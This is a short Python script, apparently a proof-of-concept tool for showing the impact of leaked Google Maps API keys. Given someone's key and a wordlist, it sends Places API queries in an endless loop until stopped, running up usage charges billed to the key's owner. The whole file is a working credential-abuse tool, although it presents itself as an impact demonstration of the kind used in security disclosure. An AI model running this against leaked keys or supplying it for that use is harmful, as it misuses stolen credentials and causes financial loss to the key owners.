import argparse
import requests
import sys
import time

from typing import List


"""
A simple program to demonstrate the impact of leaked Google Maps API keys 
by sending excessive requests to the Places API using a wordlist
"""

# Color codes
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
NC = "\033[0m"

# Google Places API endpoint
PLACES_URL = "https://maps.googleapis.com/maps/api/place/textsearch/json"

# Delay between requests
INTERVAL = 0.5

BANNER = rf"""
   __ _ _ __ ___   __ _ _ __   ___   ___ 
 / _` | '_ ` _ \ / _` | '_ \ / _ \ / __|
| (_| | | | | | | (_| | |_) | (_) | (__ 
 \__, |_| |_| |_|\__,_| .__/ \___/ \___|
 |___/                |_|               

        Google Maps API PoC tool v1.0
                 by olofmagn
"""


def parse_args() -> argparse.Namespace:
    """
    Parse command-line arguments

    Returns:
    - argparse.Namespace: Parsed command-line arguments
    """

    parser = argparse.ArgumentParser(
        description="Google Maps Places API PoC — demonstrate impact of leaked API keys"
    )

    parser.add_argument(
        "api_key", 
        help="Google Maps API key to test")

    parser.add_argument(
        "-w",
        "--wordlist",
        required=True,
        help="Path to wordlist file (one query per line)",
    )

    parser.add_argument(
        "-i",
        "--interval",
        default=INTERVAL,
        type=float,
        help=f"Interval in seconds between requests (default: {INTERVAL})",
    )

    return parser.parse_args()


def load_wordlist(file_path: str) -> List[str]:
    """
    Load words from a wordlist file

    Args:
    - file_path (str): Path to the wordlist file

    Returns:
    - List[str]: List of words to query
    """

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] Wordlist file not found: '{file_path}'{NC}")
        return []
    except Exception as e:
        print(f"{RED}[!] An unexpected error occurred: {e}{NC}")
        return []


def send_request(words: List[str], api_key: str, interval: float) -> None:
    """
    Send requests to the Google Maps Places API for each word in the list

    Args:
    - words (List[str]): List of words to query
    - api_key (str): Google Maps API key to test
    - interval (float): Seconds to wait between requests
    """

    for word in words:
        url = f"{PLACES_URL}?query={word}&key={api_key}"
        response = requests.get(url)

        if response.status_code == 200:
            print(f"{GREEN}[+] {word:<20} -> HTTP {response.status_code} {url}{NC}")
        else:
            print(f"{RED}[-] {word:<20} -> HTTP {response.status_code} {url}{NC}")

        time.sleep(interval)


def main():
    print(f"{BLUE}{BANNER}{NC}")

    args = parse_args()

    words = load_wordlist(args.wordlist)

    if not words:
        sys.exit(1)

    print(f"{BLUE}[*] Starting scan against Places API — press Ctrl+C to stop{NC}")

    try:
        while True:
            send_request(words, args.api_key, args.interval)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Scan interrupted by user{NC}")
    except Exception as e:
        print(f"\n{RED}[!] An unexpected error occurred: {e}{NC}")


if __name__ == "__main__":
    main()
